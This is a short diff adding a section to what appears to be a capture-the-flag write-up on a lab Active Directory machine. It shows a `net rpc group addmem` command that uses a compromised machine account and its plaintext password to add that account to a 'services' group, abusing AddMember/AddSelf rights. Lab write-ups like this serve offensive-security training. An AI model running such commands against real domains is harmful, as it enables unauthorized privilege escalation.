@@ -250,3 +250,10 @@ As seen here i have privs over the previously compromised machine accounts, this
 
 But i also have `AddMember` and `AddSelf` on the services group
 
+## Adding `admws01$` to the `services` group
+
+```python
+net rpc group addmem "services" "admws01$" -U "retro2.vl"/"admws01$"%'dmuhackers123!' -S "10.129.12.5"
+```
+This added me to the group
+
